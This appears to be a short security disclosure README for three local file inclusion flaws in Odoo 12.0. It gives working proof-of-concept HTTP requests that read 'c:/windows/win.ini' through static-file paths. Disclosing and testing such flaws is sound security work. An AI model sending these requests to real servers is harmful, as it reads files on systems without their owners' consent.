# Odoo-12.0-LFI-Vulnerabilities
[Odoo 12.0](https://www.odoo.com/) that is open source ERP and CRM, allows remote attackers to read local files. 

[https://www.odoo.com/security-report](https://www.odoo.com/security-report)

![alt tag](https://emreovunc.com/images/odoo-emreovunc-security.png)

# CVE-2019-XXXXX
To exploit vulnerability, someone could use 'http://[HOST]:8069/base_import/static/c:/windows/win.ini' request to get some informations from the target.

```
GET /base_import/static/c:/windows/win.ini HTTP/1.1
Host: 172.16.191.132:8069
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-3.png)


# CVE-2019-XXXXX
To exploit vulnerability, someone could use 'http://[HOST]:8069/web/static/c:/windows/win.ini' request to get some informations from the target.

```
GET /web/static/c:/windows/win.ini HTTP/1.1
Host: 172.16.191.132:8069
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-1.png)

# CVE-2019-XXXXX
To exploit vulnerability, someone could use 'http://[HOST]:8069/base/static/c:/windows/win.ini' request to get some informations from the target.

```
GET /base/static/c:/windows/win.ini HTTP/1.1
Host: 172.16.191.132:8069
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

![alt tag](https://www.emreovunc.com/blog/en/Odoo-v12-LFI-Vulnerability-2.png)
